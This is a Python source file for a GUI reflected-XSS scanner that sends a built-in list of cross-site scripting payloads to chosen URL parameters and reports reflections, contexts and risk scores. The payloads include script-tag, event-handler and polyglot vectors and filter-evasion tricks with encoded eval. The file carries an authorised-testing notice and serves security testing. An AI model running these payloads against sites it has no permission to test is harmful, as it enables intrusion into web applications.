import requests
from requests.exceptions import RequestException, Timeout, ConnectionError
import threading
import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
import time
import re
from urllib.parse import urljoin, urlparse
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import random
import string
import hashlib
import html

class KasauXSSAdvancedTester:
    def __init__(self, url, params, payloads=None, output_widget=None, progress_callback=None):
        self.url = url
        self.params = params
        self.payloads = payloads or self.get_optimized_payloads()
        self.headers = {
            "User-Agent": "KasauXSSAdvancedTester/3.0 (+https://kasau.dev)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "X-Scanner": "KasauXSS"
        }
        self.vulnerabilities = []
        self.output_widget = output_widget
        self.progress_callback = progress_callback
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.total_tests = 0
        self.completed_tests = 0
        self.test_queue = queue.Queue()
        self.unique_identifier = self.generate_unique_id()
        self.timeout = 8
        self.max_workers = 15  # Optimal balance between speed and resource usage
        self.fingerprints = set()
        self.base_response = None
        self.base_fingerprint = None

    def generate_unique_id(self):
        """Generate a unique identifier for this test session"""
        timestamp = str(int(time.time()))
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"kasau-{timestamp}-{random_str}"

    def get_optimized_payloads(self):
        """Enhanced payload collection with optimized testing order"""
        return [
            # Quick detection payloads (fastest to execute)
            "<kasauxss id='xssdetect'>",
            "<kasauxss id=xssdetect>",
            
            # Basic script tags (high probability)
            "<script>alert('XSS-Kasau')</script>",
            "<script>alert(document.domain)</script>",
            
            # Event handlers (common vectors)
            "<img src=x onerror=alert('XSS-Kasau')>",
            "<svg/onload=alert('XSS-Kasau')>",
            "<iframe src='javascript:alert(\"XSS-Kasau\")'>",
            
            # Attribute breaking (common filter bypass)
            "'\"><script>alert('XSS-Kasau')</script>",
            "\"><script>alert('XSS-Kasau')</script>",
            "javascript:alert('XSS-Kasau')",
            
            # Filter evasion (case, encoding)
            "<ScRiPt>alert('XSS-Kasau')</ScRiPt>",
            "<script>alert(String.fromCharCode(75,97,115,97,117))</script>",
            "<svg><script>alert('XSS-Kasau')</script></svg>",
            
            # HTML5 vectors
            "<details open ontoggle=alert('XSS-Kasau')>",
            "<video><source onerror=alert('XSS-Kasau')>",
            
            # Advanced evasion
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,45,75,97,115,97,117,39,41))</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUy1LYXNhdScp'))>",
            
            # Context-specific
            "'-alert('XSS-Kasau')-'",
            "\";alert('XSS-Kasau');//",
            
            # Polyglot payloads
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('XSS-Kasau')//'>",
            
            # DOM-based candidates
            "#<script>alert('XSS-Kasau')</script>",
            "?param=test#\" onload=\"alert('XSS-Kasau')",
            
            # Advanced mutation
            "<script/src=data:,alert('XSS-Kasau')>",
            "<script x=1>alert('XSS-Kasau')</script>"
        ]

    def log(self, message, color=None):
        """Enhanced logging with color support and timestamps"""
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        formatted_message = f"[{timestamp}] {message}"
        
        if self.output_widget:
            self.output_widget.config(state='normal')
            self.output_widget.insert(tk.END, formatted_message + "\n")
            self.output_widget.see(tk.END)
            self.output_widget.config(state='disabled')
        else:
            if color:
                print(f"{color}{formatted_message}\033[0m")
            else:
                print(formatted_message)

    def generate_response_fingerprint(self, response):
        """Generate a fingerprint for response comparison"""
        content = response.text
        headers = str(response.headers).lower()
        
        # Create a hash of important characteristics
        fingerprint_data = f"{len(content)}|{response.status_code}|{headers}"
        return hashlib.md5(fingerprint_data.encode()).hexdigest()

    def get_base_response(self):
        """Get the base response without any payloads for comparison"""
        if self.base_response is None:
            try:
                self.base_response = self.session.get(
                    self.url,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                self.base_fingerprint = self.generate_response_fingerprint(self.base_response)
            except Exception as e:
                self.log(f"Failed to get base response: {str(e)}")
                self.base_response = None
                self.base_fingerprint = None
        return self.base_response

    def is_response_different(self, response):
        """Check if the response is meaningfully different from base"""
        if self.base_fingerprint is None:
            return True  # If we can't get base, assume all responses are interesting
            
        current_fingerprint = self.generate_response_fingerprint(response)
        return current_fingerprint != self.base_fingerprint

    def is_reflected(self, payload, response_text):
        """Enhanced reflection detection with multiple techniques"""
        # Direct reflection
        if payload in response_text:
            return True, "Direct reflection"
        
        # HTML entity encoding check
        html_encoded = html.escape(payload)
        if html_encoded in response_text:
            return True, "HTML encoded reflection"
            
        # Partial reflection check (for broken payloads)
        payload_parts = re.findall(r'[a-zA-Z0-9]+', payload)
        if len(payload_parts) > 1:
            found_parts = sum(1 for part in payload_parts if part in response_text)
            if found_parts >= len(payload_parts) * 0.6:  # 60% of parts found
                return True, f"Partial reflection ({found_parts}/{len(payload_parts)} parts)"
        
        # Check for our unique marker if using marker payloads
        if "kasauxss" in payload.lower() and "xssdetect" in response_text.lower():
            return True, "Marker detected"
        
        return False, "No reflection detected"

    def check_xss_context(self, payload, response_text):
        """Analyze the context where XSS payload appears with more precision"""
        contexts = []
        
        # Check if in script tag
        script_pattern = r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>'
        if re.search(script_pattern, response_text, re.IGNORECASE | re.DOTALL):
            contexts.append("Inside script tag")
            
        # Check if in attribute
        attr_pattern = r'<[a-zA-Z][^>]*\s[a-zA-Z-]+=["\'][^"\']*?' + re.escape(payload) + r'[^"\']*?["\']'
        if re.search(attr_pattern, response_text, re.IGNORECASE):
            contexts.append("Inside HTML attribute")
            
        # Check if in HTML content
        content_pattern = r'>[^<]*' + re.escape(payload) + r'[^<]*<'
        if re.search(content_pattern, response_text):
            contexts.append("Inside HTML content")
            
        # Check for JavaScript context
        js_pattern = r'(?:var|let|const)\s+\w+\s*=\s*["\'].*?' + re.escape(payload) + r'.*?["\']'
        if re.search(js_pattern, response_text, re.IGNORECASE):
            contexts.append("Inside JavaScript variable")
            
        return contexts if contexts else ["Unknown context"]

    def test_param_payload(self, param, payload):
        """Enhanced parameter testing with better analysis and performance"""
        try:
            # Test GET request
            start_time = time.time()
            response = self.session.get(
                self.url, 
                params={param: payload}, 
                timeout=self.timeout,
                allow_redirects=True
            )
            response_time = time.time() - start_time
            
            # Skip analysis if response is identical to base
            if not self.is_response_different(response):
                self.log(f"  [-] Identical response for '{param}' with payload: {payload[:30]}...")
                return

            if response.status_code == 200:
                is_reflected, reflection_type = self.is_reflected(payload, response.text)
                
                if is_reflected:
                    contexts = self.check_xss_context(payload, response.text)
                    vulnerability_info = {
                        'parameter': param,
                        'payload': payload,
                        'method': 'GET',
                        'reflection_type': reflection_type,
                        'contexts': contexts,
                        'response_time': response_time,
                        'response_length': len(response.text),
                        'content_type': response.headers.get('content-type', 'unknown'),
                        'status_code': response.status_code
                    }
                    
                    with self.lock:
                        self.vulnerabilities.append(vulnerability_info)
                        self.log(f"\033[91m[!] POTENTIAL XSS in {param} ({reflection_type})\033[0m", "\033[91m")
                        self.log(f"     Payload: {payload[:100]}{'...' if len(payload) > 100 else ''}")
                        self.log(f"     Context: {', '.join(contexts)}")
                        self.log(f"     Response: {len(response.text)} bytes, {response_time:.2f}s")
                else:
                    self.log(f"  [-] No reflection for '{param}' ({reflection_type})")
            
            elif response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('location', '')
                if payload in location:
                    self.log(f"  [!] Payload reflected in redirect location for '{param}'")
            
            else:
                self.log(f"  [!] Status {response.status_code} for '{param}' with payload: {payload[:30]}...")
                
        except Timeout:
            self.log(f"  [!] Timeout testing '{param}' with payload: {payload[:30]}...")
        except ConnectionError:
            self.log(f"  [!] Connection error testing '{param}'")
        except RequestException as e:
            self.log(f"  [!] Request failed for '{param}': {str(e)[:100]}")
        except Exception as e:
            self.log(f"  [!] Unexpected error testing '{param}': {str(e)}")
        
        finally:
            with self.lock:
                self.completed_tests += 1
                if self.progress_callback:
                    progress = (self.completed_tests / self.total_tests) * 100
                    self.progress_callback(progress)

    def worker(self):
        """Worker thread for processing test queue"""
        while True:
            try:
                param, payload = self.test_queue.get(timeout=1)
                self.test_param_payload(param, payload)
                self.test_queue.task_done()
            except queue.Empty:
                break
            except Exception as e:
                self.log(f"Worker error: {str(e)}")
                continue

    def run_tests(self):
        """Optimized test execution with thread pooling"""
        self.vulnerabilities.clear()
        self.completed_tests = 0
        self.total_tests = len(self.params) * len(self.payloads)
        
        self.log("="*80)
        self.log("KASAU XSS ADVANCED PENETRATION TESTING TOOL v3.0")
        self.log("Created by: Kasau (https://kasau.dev)")
        self.log("="*80)
        self.log(f"Target URL: {self.url}")
        self.log(f"Parameters to test: {', '.join(self.params)}")
        self.log(f"Total payloads: {len(self.payloads)}")
        self.log(f"Total tests to perform: {self.total_tests}")
        self.log(f"Concurrent workers: {self.max_workers}")
        self.log(f"Unique test ID: {self.unique_identifier}")
        self.log("="*80)
        
        # Get base response for comparison
        self.log("Getting base response for comparison...")
        self.get_base_response()
        
        # Fill the test queue
        for param in self.params:
            for payload in self.payloads:
                self.test_queue.put((param, payload))
        
        # Start worker threads
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.worker) for _ in range(self.max_workers)]
            
            # Monitor progress
            while self.completed_tests < self.total_tests:
                time.sleep(0.5)
                if self.progress_callback:
                    progress = (self.completed_tests / self.total_tests) * 100
                    self.progress_callback(progress)
        
        # Generate final report
        test_duration = time.time() - start_time
        self.log(f"\nCompleted {self.total_tests} tests in {test_duration:.2f} seconds")
        self.log(f"Average speed: {self.total_tests/max(test_duration, 0.1):.1f} tests/second")
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive vulnerability report with risk scoring"""
        self.log("\n" + "="*80)
        self.log("PENETRATION TEST RESULTS")
        self.log("="*80)
        
        if self.vulnerabilities:
            self.log(f"\033[91m[!!!] {len(self.vulnerabilities)} POTENTIAL XSS VULNERABILITIES FOUND:\033[0m", "\033[91m")
            
            # Group by parameter and calculate risk scores
            param_groups = {}
            for vuln in self.vulnerabilities:
                param = vuln['parameter']
                if param not in param_groups:
                    param_groups[param] = []
                param_groups[param].append(vuln)
            
            # Sort parameters by vulnerability count
            sorted_params = sorted(param_groups.items(), key=lambda x: len(x[1]), reverse=True)
            
            for param, vulns in sorted_params:
                self.log(f"\n--- Parameter: {param} ({len(vulns)} vulnerabilities) ---")
                
                # Sort vulnerabilities by risk level
                vulns.sort(key=lambda x: self.calculate_risk_score(x), reverse=True)
                
                for i, vuln in enumerate(vulns[:10], 1):  # Show top 10 per parameter
                    risk_score = self.calculate_risk_score(vuln)
                    self.log(f"{i}. Risk: {risk_score}/10 - {vuln['reflection_type']}")
                    self.log(f"   Payload: {vuln['payload'][:100]}{'...' if len(vuln['payload']) > 100 else ''}")
                    self.log(f"   Context: {', '.join(vuln['contexts'])}")
                    self.log(f"   Response: {vuln['status_code']} ({vuln['response_length']} bytes, {vuln['response_time']:.2f}s)")
                
                if len(vulns) > 10:
                    self.log(f"   ... and {len(vulns)-10} more vulnerabilities for this parameter")
            
            # Summary statistics
            high_risk = sum(1 for v in self.vulnerabilities if self.calculate_risk_score(v) >= 8)
            medium_risk = sum(1 for v in self.vulnerabilities if 5 <= self.calculate_risk_score(v) < 8)
            low_risk = len(self.vulnerabilities) - high_risk - medium_risk
            
            self.log(f"\nRISK ASSESSMENT SUMMARY:")
            self.log(f"High Risk (8-10): {high_risk} vulnerabilities")
            self.log(f"Medium Risk (5-7): {medium_risk} vulnerabilities")
            self.log(f"Low Risk (1-4): {low_risk} vulnerabilities")
            
            # Recommended actions
            self.log(f"\nRECOMMENDED ACTIONS:")
            if high_risk > 0:
                self.log("- IMMEDIATE remediation required for high-risk vulnerabilities")
            if medium_risk > 0:
                self.log("- Prioritize fixing medium-risk vulnerabilities")
            if low_risk > 0:
                self.log("- Review low-risk vulnerabilities for potential improvements")
            
        else:
            self.log("\033[92m[✓] NO XSS VULNERABILITIES DETECTED\033[0m", "\033[92m")
            self.log("The application appears to be properly filtering user input.")
        
        self.log(f"\nTest completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.log("="*80)

    def calculate_risk_score(self, vulnerability):
        """Calculate a risk score (1-10) for a vulnerability"""
        score = 5  # Base score
        
        # Increase score based on context
        contexts = vulnerability['contexts']
        if any("script tag" in c.lower() for c in contexts):
            score += 3
        elif any("javascript" in c.lower() for c in contexts):
            score += 2
        elif any("attribute" in c.lower() for c in contexts):
            score += 1
            
        # Increase score based on reflection type
        reflection = vulnerability['reflection_type'].lower()
        if "direct" in reflection:
            score += 2
        elif "partial" in reflection:
            score += 1
            
        # Adjust based on response characteristics
        content_type = vulnerability['content_type'].lower()
        if "text/html" in content_type:
            score += 1
        elif "application/json" in content_type:
            score -= 1
            
        return min(max(score, 1), 10)  # Clamp between 1 and 10

def run_gui():
    def update_progress(value):
        progress_var.set(value)
        progress_label.config(text=f"Progress: {value:.1f}%")
        root.update_idletasks()

    def on_test_click():
        url = url_entry.get().strip()
        params = params_entry.get().strip()
        custom_payloads = payloads_text.get("1.0", tk.END).strip()
        workers = workers_entry.get()

        if not url or not params:
            messagebox.showwarning("Input Error", "URL and Parameters are required!")
            return

        # Validate URL
        try:
            parsed_url = urlparse(url)
            if not parsed_url.scheme or not parsed_url.netloc:
                messagebox.showwarning("Input Error", "Please enter a valid URL with protocol (http/https)")
                return
        except Exception:
            messagebox.showwarning("Input Error", "Invalid URL format")
            return

        param_list = [p.strip() for p in params.split(",") if p.strip()]
        if not param_list:
            messagebox.showwarning("Input Error", "Please enter at least one parameter.")
            return

        # Parse custom payloads
        payload_list = None
        if custom_payloads:
            payload_list = [pl.strip() for pl in custom_payloads.split("\n") if pl.strip()]

        # Validate workers count
        try:
            workers_count = int(workers) if workers else 15
            workers_count = max(1, min(50, workers_count))  # Limit between 1-50
        except ValueError:
            messagebox.showwarning("Input Error", "Worker count must be a number")
            return

        # Clear output and reset progress
        output_text.config(state='normal')
        output_text.delete('1.0', tk.END)
        output_text.config(state='disabled')
        progress_var.set(0)
        progress_label.config(text="Progress: 0.0%")

        # Disable test button during testing
        test_btn.config(state='disabled', text='Testing...')

        def test_complete():
            test_btn.config(state='normal', text='Start Penetration Test')

        def run_test():
            try:
                tester = KasauXSSAdvancedTester(
                    url, 
                    param_list, 
                    payload_list, 
                    output_text, 
                    update_progress
                )
                tester.max_workers = workers_count
                tester.run_tests()
            except Exception as e:
                output_text.config(state='normal')
                output_text.insert(tk.END, f"\n[ERROR] {str(e)}\n")
                output_text.config(state='disabled')
            finally:
                root.after(0, test_complete)

        threading.Thread(target=run_test, daemon=True).start()

    def load_payloads_example():
        example_payloads = """<script>alert('XSS-Kasau')</script>
<img src=x onerror=alert('XSS-Kasau')>
<svg/onload=alert('XSS-Kasau')>
'\"><script>alert('XSS')</script>
<iframe src='javascript:alert("XSS-Kasau")'>
<details open ontoggle=alert('XSS-Kasau')>"""
        payloads_text.delete("1.0", tk.END)
        payloads_text.insert("1.0", example_payloads)

    # Main window setup
    root = tk.Tk()
    root.title("Kasau XSS Advanced Penetration Testing Tool v3.0")
    root.geometry("1000x800")
    root.configure(bg='#2b2b2b')

    # Styling
    style = ttk.Style()
    style.theme_use('clam')
    style.configure('TFrame', background='#2b2b2b')
    style.configure('Title.TLabel', font=('Arial', 14, 'bold'), foreground='#ffffff', background='#2b2b2b')
    style.configure('Header.TLabel', font=('Arial', 10, 'bold'), foreground='#ffffff', background='#2b2b2b')
    style.configure('TButton', font=('Arial', 10), padding=5)
    style.configure('TEntry', font=('Consolas', 10))
    style.configure('TCombobox', font=('Consolas', 10))

    # Header
    header_frame = ttk.Frame(root)
    header_frame.pack(fill='x', padx=10, pady=10)
    
    title_label = ttk.Label(header_frame, text="KASAU XSS ADVANCED PENETRATION TESTING TOOL", style='Title.TLabel')
    title_label.pack()
    
    version_label = ttk.Label(header_frame, text="Version 3.0 - Created by Kasau (https://kasau.dev)", style='Header.TLabel')
    version_label.pack()

    # Input frame
    input_frame = ttk.Frame(root)
    input_frame.pack(fill='x', padx=10, pady=5)

    # URL input
    ttk.Label(input_frame, text="Target URL:", style='Header.TLabel').pack(anchor='w', pady=(5,0))
    url_entry = ttk.Entry(input_frame, width=100)
    url_entry.pack(fill='x', pady=(2,5))
    url_entry.insert(0, "https://example.com/search.php")

    # Parameters input
    ttk.Label(input_frame, text="Parameters to test (comma-separated):", style='Header.TLabel').pack(anchor='w', pady=(5,0))
    params_entry = ttk.Entry(input_frame, width=100)
    params_entry.pack(fill='x', pady=(2,5))
    params_entry.insert(0, "q,search,query,input")

    # Workers input
    ttk.Label(input_frame, text="Concurrent workers (1-50):", style='Header.TLabel').pack(anchor='w', pady=(5,0))
    workers_entry = ttk.Entry(input_frame, width=10)
    workers_entry.pack(anchor='w', pady=(2,5))
    workers_entry.insert(0, "15")

    # Custom payloads input
    payload_frame = ttk.Frame(input_frame)
    payload_frame.pack(fill='x', pady=5)
    
    ttk.Label(payload_frame, text="Custom Payloads (one per line, optional - leave empty for default set):", style='Header.TLabel').pack(anchor='w')
    
    button_frame = ttk.Frame(payload_frame)
    button_frame.pack(fill='x')
    
    load_example_btn = ttk.Button(button_frame, text="Load Example Payloads", command=load_payloads_example)
    load_example_btn.pack(side='right', padx=(5,0))
    
    payloads_text = scrolledtext.ScrolledText(payload_frame, height=6, font=('Consolas', 9), 
                                            bg='#1e1e1e', fg='#ffffff', insertbackground='white')
    payloads_text.pack(fill='x', pady=(5,0))

    # Control frame
    control_frame = ttk.Frame(root)
    control_frame.pack(fill='x', padx=10, pady=10)

    test_btn = ttk.Button(control_frame, text="Start Penetration Test", command=on_test_click,
                         style='TButton')
    test_btn.pack(side='left')

    # Progress bar
    progress_var = tk.DoubleVar()
    progress_bar = ttk.Progressbar(control_frame, variable=progress_var, maximum=100, length=300)
    progress_bar.pack(side='right', padx=(10,0))
    
    progress_label = ttk.Label(control_frame, text="Progress: 0.0%", style='Header.TLabel')
    progress_label.pack(side='right', padx=(10,5))

    # Output area
    output_frame = ttk.Frame(root)
    output_frame.pack(fill='both', expand=True, padx=10, pady=5)
    
    ttk.Label(output_frame, text="Test Output:", style='Header.TLabel').pack(anchor='w')
    
    output_text = scrolledtext.ScrolledText(output_frame, state='disabled', wrap=tk.WORD, 
                                          font=('Consolas', 9), bg='#1e1e1e', fg='#00ff00',
                                          insertbackground='white')
    output_text.pack(fill='both', expand=True)

    # Footer
    footer_frame = ttk.Frame(root)
    footer_frame.pack(fill='x', side='bottom')
    
    footer_label = ttk.Label(footer_frame, 
                           text="⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY - Created by Kasau", 
                           style='Header.TLabel')
    footer_label.pack(pady=5)

    # Warning dialog on startup
    messagebox.showwarning("Legal Notice", 
                          "This tool is for authorized penetration testing only.\n\n"
                          "Only use this tool on systems you own or have explicit written permission to test.\n\n"
                          "Unauthorized testing may violate local laws and regulations.\n\n"
                          "The creator (Kasau) is not responsible for misuse of this tool.")

    root.mainloop()

if __name__ == "__main__":
    run_gui()
